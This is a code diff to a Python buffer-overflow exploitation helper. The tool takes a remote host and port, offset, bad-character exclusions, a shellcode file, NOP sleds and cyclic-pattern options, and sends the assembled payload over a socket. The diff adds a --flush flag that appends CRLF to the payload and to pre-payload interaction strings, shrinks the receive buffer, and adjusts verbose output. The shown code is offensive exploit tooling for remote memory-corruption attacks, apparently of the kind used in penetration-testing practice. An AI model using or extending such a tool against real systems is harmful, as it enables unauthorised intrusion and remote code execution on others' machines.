@@ -76,6 +76,7 @@ def print_usage(scriptName):
 	print(" --nopsb|nopsa	: Amount of nops to add before and/or after the additional write content (be if badchars, shellcode or simple hexstring). Default is 0.")
 	print(" --value		: Offset value.")
 	print(" --length	: Cyclic pattern length.")
+	print(" --flush		: Adds '\\r\\n' at the end of the payload.")
 
 
 # Auxiliary functions ###################################################################
@@ -248,7 +249,7 @@ def create_write_payload_additional(buffHead, buffSize, offsetCount, binContent,
 #########################################################################################
 
 if __name__ == "__main__":
-	DEFAULT_SOCKET_BUFF_SIZE = 4096
+	DEFAULT_SOCKET_BUFF_SIZE = 1024
 	scriptName = sys.argv[0]
 
 	# Avaiable modes
@@ -256,7 +257,7 @@ if __name__ == "__main__":
 
 	# Input parameters
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nopsb=", "nopsa=", "interact=", "value=", "length="])
+		opts, args = getopt.getopt(sys.argv[1:], "hnvfm:", ["help", "norec", "verbose", "flush", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nopsb=", "nopsa=", "interact=", "value=", "length="])
 	except getopt.GetoptError as err:
 		print("Error:", err)
 		print_usage(scriptName)
@@ -287,6 +288,8 @@ if __name__ == "__main__":
 	
 	before = ""
 	after = ""
+	
+	flush = False
 
 	# Verify options
 	for opt, value in opts:
@@ -297,6 +300,8 @@ if __name__ == "__main__":
 			norec = True
 		elif opt in ("-v", "--verbose"):
 			VERBOSE = True
+		elif opt in ("-f", "--flush"):
+			flush = True
 		elif opt in ("-m", "--mode"):
 			mode = value
 			if mode not in AVAILABLE_MODES:
@@ -338,7 +343,7 @@ if __name__ == "__main__":
 			print_usage(scriptName)
 			sys.exit(1)
 
-	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nopsb={} | nopsa={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nopsb, nopsa, interact, patternValue, patternLength)) if VERBOSE else None
+	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nopsb={} | nopsa={} | interact={} | value={} | length={} | flush={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nopsb, nopsa, interact, patternValue, patternLength, flush)) if VERBOSE else None
 
 	# Tool
 	if not mode:
@@ -430,12 +435,14 @@ if __name__ == "__main__":
 		# Interact with the application before sending the payload		
 		for tValue in interact:
 			print("") if VERBOSE else None
-			print("App interaction, sending: {}".format(tValue)) if VERBOSE else None
-			interactValue = tValue.encode()			
+			tValue = tValue + "\r\n"
+			interactValue = tValue.encode()	
+			print("App interaction, sending: [{}]".format(interactValue)) if VERBOSE else None
 			s.send(interactValue)
 
 			# Application payload return
-			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
+			print("Return:")
+			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)	
 			print(r) if VERBOSE else None
 
 		# Send payload
@@ -444,12 +451,15 @@ if __name__ == "__main__":
 		print(buffPayload) if VERBOSE else None
 		print("") if VERBOSE else None
 
+		if flush:
+			buffPayload = buffPayload + "\r\n".encode()
+	
 		s.send(buffPayload)
 
 		# Application payload return
 		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
 
-		print("Payload return") if VERBOSE else None
+		print("Payload return:") if VERBOSE else None
 		print(r) if VERBOSE else None
 
 	except KeyboardInterrupt:
